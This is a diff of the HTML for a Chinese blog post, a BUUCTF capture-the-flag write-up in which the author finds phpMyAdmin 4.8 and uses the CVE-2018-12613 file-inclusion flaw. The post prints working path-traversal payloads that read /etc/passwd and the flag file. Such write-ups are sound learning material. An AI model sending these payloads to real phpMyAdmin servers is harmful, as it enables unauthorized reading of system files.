@@ -13,20 +13,12 @@
 <meta property="og:site_name" content="HDFZZF&#39;s BLOG">
 <meta property="og:description" content="BUUCTF 网址：https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204732.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204816.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204824.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204843.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204938.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205506.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205738.png">
 <meta property="article:published_time" content="2022-03-23T16:00:00.000Z">
 <meta property="article:modified_time" content="2022-03-24T13:00:45.682Z">
 <meta property="article:author" content="hdfzzf">
 <meta property="article:tag" content="phpmyadmin 漏洞">
 <meta property="article:tag" content="CVE-2018-12613">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204732.png">
     
     
       
@@ -162,13 +154,19 @@
 <span id="more"></span>
 <h1 id="题目信息">题目信息</h1>
 <p>进入环境之后，不论是数据包还是页面源码，什么信息都没有，只有如下看不懂的字</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204732.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204732.png" /></p>
 <p>因此，决定扫描目录，结果如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204816.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204824.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204843.png" /></p>
-<p>将所有都访问一次，发现只有 <code>/phpmyadmin</code> 有用，界面如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204938.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204816.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204824.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204843.png" /></p>
+<p>将所有都访问一次，发现只有 <code>/phpmyadmin</code>
+有用，界面如下：</p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204938.png" /></p>
 <h1 id="解题">解题</h1>
 <p>通过该页面发现：</p>
 <ol type="1">
@@ -178,14 +176,20 @@
 <li><p>PHP版本信息为 7.2.24-0ubuntu0.18.04.1</p></li>
 <li><p>系统为 Ubuntu</p></li>
 </ol>
-<p>第一次碰到这种题目，有点懵逼，就去百度了一下 <code>phpmyadmin 4.8 漏洞</code> 发现了存在 <code>CVE-2018-12613</code> 远程文件包含漏洞。将找到的payload（这里要注意系统是Windows还是Linux）尝试一下：</p>
+<p>第一次碰到这种题目，有点懵逼，就去百度了一下
+<code>phpmyadmin 4.8 漏洞</code> 发现了存在 <code>CVE-2018-12613</code>
+远程文件包含漏洞。将找到的payload（这里要注意系统是Windows还是Linux）尝试一下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../etc/passwd # linux payload</span><br></pre></td></tr></table></figure>
 <p>结果：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205506.png" /></p>
-<p>发现确实存在漏洞，那么将 <code>/etc/passwd</code> 改为我们想要的文件路径即可。问题是这里我们不知道 flag 在哪，一般在根目录或者网站目录，这里只知道根目录，所以就尝试以下根目录，即</p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205506.png" /></p>
+<p>发现确实存在漏洞，那么将 <code>/etc/passwd</code>
+改为我们想要的文件路径即可。问题是这里我们不知道 flag
+在哪，一般在根目录或者网站目录，这里只知道根目录，所以就尝试以下根目录，即</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure>
 <p>得到 flag</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205738.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205738.png" /></p>
 <h1 id="总结">总结</h1>
 <p>本题考的是平常的总结，以及对信息的敏感度。看到一些版本信息要想到是否存在该版本特有的信息，并且即使搜索。平常遇到这类的问题也要多积累。</p>
 
@@ -256,7 +260,7 @@
     Copyright &copy;
     
     
-    2021-2022
+    2021-2023
     hdfzzf
   </div>
   <div class="footer-right">
